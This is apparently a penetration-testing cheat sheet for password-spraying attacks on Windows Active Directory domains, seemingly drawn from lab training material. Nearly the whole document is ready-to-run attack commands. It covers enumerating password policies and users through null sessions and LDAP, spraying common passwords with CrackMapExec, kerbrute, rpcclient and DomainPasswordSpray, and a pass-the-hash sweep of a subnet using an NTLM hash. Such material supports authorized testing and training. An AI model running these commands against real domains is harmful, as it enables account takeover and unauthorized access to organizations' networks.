# Password Spray Attack

## Tools: CrackMapExec/Netexec , sprayhound

## TIP: Get password policy first to prevent account lockouts! Usually, you need creds for this, but before starting the spray you may get the policy)

## Commands:

### Password Policy

 - netexec IP -u 'USER' -p 'PASSWORD' --pass-pol

 - enum4linux -u 'USERNAME' -p 'PASSWORD' -P IP

 - Get-ADDefaultDomainPasswordPolicy

 - Get-ADFineGrainedPasswordPolicy -filter * (Fine Grained Password Policy (FGPP)

 - Get-ADUserResultantPasswordPolicy -Identity USER

 - ldapsearch-ad.py --server 'DC' -d DOMAIN -u USER -p PASS --type pass-pols

### Password Spray

 - netexec smb DC_IP -u USER.TXT -p PASSWORD.TXT --no-bruteforce (Test user=password)

 - netexec smb DC_IP -u USER.TXT -p PASSWORD.TXT (Multiple test)

 - sprayhound -U USERS.TXT -d DOMAIN -dc DC_IP

# Password Spraying & Password Policies

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `#!/bin/bash  for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}     do echo $x; done` | Bash script used to generate `16,079,616` possible username combinations from a Linux-based host. |
| `crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol` | Uses `CrackMapExec`and valid credentials (`avazquez:Password123`) to enumerate the password policy (`--pass-pol`) from a Linux-based host. |
| `rpcclient -U "" -N 172.16.5.5`                              | Uses `rpcclient` to discover information about the domain through `SMB NULL` sessions. Performed from a Linux-based host. |
| `rpcclient $> querydominfo`                                  | Uses `rpcclient` to enumerate the password policy in a target Windows domain from a Linux-based host. |
| `enum4linux  -P 172.16.5.5`                                  | Uses `enum4linux` to enumerate the password policy (`-P`) in a target Windows domain from a Linux-based host. |
| `enum4linux-ng -P 172.16.5.5 -oA ilfreight`                  | Uses `enum4linux-ng` to enumerate the password policy (`-P`) in a target Windows domain from a Linux-based host, then presents the output in YAML & JSON saved in a file proceeding the `-oA` option. |
| `ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" \| grep -m 1 -B 10 pwdHistoryLength` | Uses `ldapsearch` to enumerate the password policy in a  target Windows domain from a Linux-based host. |
| `net accounts`                                               | Used to enumerate the password policy in a Windows domain from a Windows-based host. |
| `Import-Module .\PowerView.ps1`                              | Uses the Import-Module cmd-let to import the `PowerView.ps1` tool from a Windows-based host. |
| `Get-DomainPolicy`                                           | Used to enumerate the password policy in a target Windows domain from a Windows-based host. |
| `enum4linux -U 172.16.5.5  \| grep "user:" \| cut -f2 -d"[" \| cut -f1 -d"]"` | Uses `enum4linux` to discover user accounts in a target Windows domain, then leverages `grep` to filter the output to just display the user from a Linux-based host. |
| `rpcclient -U "" -N 172.16.5.5  rpcclient $> enumdomuser`    | Uses rpcclient to discover user accounts in a target Windows domain from a Linux-based host. |
| `crackmapexec smb 172.16.5.5 --users`                        | Uses `CrackMapExec` to discover users (`--users`) in a target Windows domain from a Linux-based host. |
| `ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  \| grep sAMAccountName: \| cut -f2 -d" "` | Uses `ldapsearch` to discover users in a target Windows doman, then filters the output using `grep` to show only the `sAMAccountName` from a Linux-based host. |
| `./windapsearch.py --dc-ip 172.16.5.5 -u "" -U`              | Uses the python tool `windapsearch.py` to discover users in a target Windows domain from a Linux-based host. |
| `for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 \| grep Authority; done` | Bash one-liner used to perform a password spraying attack using `rpcclient` and a list of users (`valid_users.txt`) from a Linux-based host. It also filters out failed attempts to make the output cleaner. |
| `kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1` | Uses `kerbrute` and a list of users (`valid_users.txt`) to perform a password spraying attack against a target Windows domain from a Linux-based host. |
| `sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 \| grep +` | Uses `CrackMapExec` and a list of users (`valid_users.txt`) to perform a password spraying attack against a target Windows domain from a Linux-based host. It also filters out logon failures using `grep`. |
| ` sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123` | Uses `CrackMapExec` to validate a set of credentials from a Linux-based host. |
| `sudo crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf \| grep +` | Uses `CrackMapExec` and the -`-local-auth` flag to ensure only one login attempt is performed from a Linux-based host. This is to ensure accounts are not locked out by enforced password policies. It also filters out logon failures using `grep`. |
| `Import-Module .\DomainPasswordSpray.ps1`                    | Used to import the PowerShell-based tool `DomainPasswordSpray.ps1` from a Windows-based host. |
| `Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue` | Performs a password spraying attack and outputs (-OutFile) the results to a specified file (`spray_success`) from a Windows-based host. |
